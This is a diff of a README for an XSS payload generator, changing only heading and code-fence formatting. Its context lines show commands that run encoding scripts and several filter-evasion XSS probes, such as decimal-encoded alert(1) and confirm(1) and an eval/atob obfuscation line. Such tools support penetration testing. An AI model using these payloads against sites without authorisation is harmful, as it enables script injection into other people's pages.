@@ -1,6 +1,6 @@
-# xss-payloads-generator
+## xss-payloads-generator
  
-```
+```yaml
 cat payloads.txt | python3 Decimal-Encoded-Payloads-Special-Characters.py
 cat payloads.txt | python3 Decimal-Encoded-Payloads.py
 cat payloads.txt | python3 Different-Event-Handlers.py
@@ -21,7 +21,7 @@ cat payloads.txt | python3 Mixed-Encoding-Payloads.py
 ```
 
 ## alert(1)
-```
+```yaml
 bash main.sh
 // Decimal-Encoded-Payloads
 &#97;lert(1)
@@ -151,7 +151,7 @@ eval(String.fromCharCode(...atob(decodeURIComponent('YWxlcnQ%3D')).split('').map
 ```
 
 ## confirm(1)
-```
+```yaml
 bash main.sh
 // Decimal-Encoded-Payloads
 &#99;onfirm(1)
@@ -293,7 +293,7 @@ eval(String.fromCharCode(...atob(decodeURIComponent('Y29uZmlybQ%3D%3D')).split('
 ```
 
 ## prompt(1)
-```
+```yaml
 bash main.sh
 // Decimal-Encoded-Payloads
 &#112;rompt(1)
